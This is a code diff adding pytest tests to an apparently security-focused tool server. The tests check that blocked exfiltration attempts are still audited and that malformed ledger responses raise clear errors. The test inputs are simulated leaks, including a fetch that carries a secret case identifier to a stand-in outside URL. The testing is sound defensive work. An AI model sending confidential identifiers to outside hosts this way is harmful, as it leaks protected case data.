@@ -177,6 +177,78 @@ def test_screen_normalizes_separators():
     asyncio.run(_go())
 
 
+def test_blocked_screen_leaves_audit_row():
+    """MF1: a pre-egress screen block (an exfiltration attempt — the highest-signal event) must STILL write an
+    audit row. Previously _screen raised before the first audit.record, so a blocked exfil left no trace,
+    breaking control #10 (every egress attempt audited) on exactly the path that matters most."""
+
+    def blocked_count():
+        return srv.audit._conn.execute(
+            "SELECT COUNT(*) c FROM egress_log WHERE outcome=?", ("blocked (screen)",)
+        ).fetchone()["c"]
+
+    async def _go() -> None:
+        async with Client(mcp) as c:
+            before = blocked_count()
+            for tool, args in (
+                ("search", {"query": "leak SECRET-CASE-42 now", "connector": "web"}),
+                ("fetch", {"url": "https://x.invalid/SECRET-CASE-42", "confirmed": True}),
+            ):
+                try:
+                    await c.call_tool(tool, args)
+                    raise AssertionError(f"expected ToolError from {tool}")
+                except ToolError as e:
+                    assert "case/source identifier" in str(e)
+            assert blocked_count() == before + 2  # both blocked attempts left an audit trail
+            assert srv.audit.verify_chain().ok is True  # and the audit chain + manifest stay consistent
+
+    asyncio.run(_go())
+
+
+def test_propose_handles_dict_shaped_ledger_response(monkeypatch):
+    """MF2: evidence-ledger's structured result may arrive as a plain dict (this client holds no pydantic model
+    for the callee's output schema). propose_to_ledger must read evidence_id from a dict-or-model, never crash
+    on a bare `.evidence_id` deref (which would mask every ledger write as an opaque error)."""
+
+    class _Res:
+        def __init__(self, data):
+            self.data = data
+
+    def fake_client(data):
+        class _FakeClient:
+            async def __aenter__(self):
+                return self
+
+            async def __aexit__(self, *a):
+                return False
+
+            async def call_tool(self, name, args):
+                return _Res(data)
+
+        return lambda: _FakeClient()
+
+    async def _go() -> None:
+        async with Client(mcp) as c:
+            tok = srv.artifacts.put(b"\xff\xd8\xff\xe0 img")
+            # a well-formed DICT result -> evidence_id read from the dict, no AttributeError crash
+            monkeypatch.setattr(srv, "_ledger_client", fake_client({"evidence_id": "ev-dict", "case_id": "c1"}))
+            p = await c.call_tool(
+                "propose_to_ledger", {"case_id": "c1", "artifact_ref": tok, "source_id": "s", "note": "n"}
+            )
+            assert p.data.evidence_id == "ev-dict"
+            # a shape-drifted dict (no evidence_id) -> a clear ToolError, not an opaque masked error
+            monkeypatch.setattr(srv, "_ledger_client", fake_client({"unexpected": "shape"}))
+            try:
+                await c.call_tool(
+                    "propose_to_ledger", {"case_id": "c1", "artifact_ref": tok, "source_id": "s", "note": "n"}
+                )
+                raise AssertionError("expected ToolError for a dict missing evidence_id")
+            except ToolError as e:
+                assert "unexpected response shape" in str(e)
+
+    asyncio.run(_go())
+
+
 def test_propose_requires_configured_ledger(monkeypatch):
     """M1: with no evidence-ledger connection configured, propose fails closed (does NOT open a second
     in-process writer to the single-writer evidence.db)."""
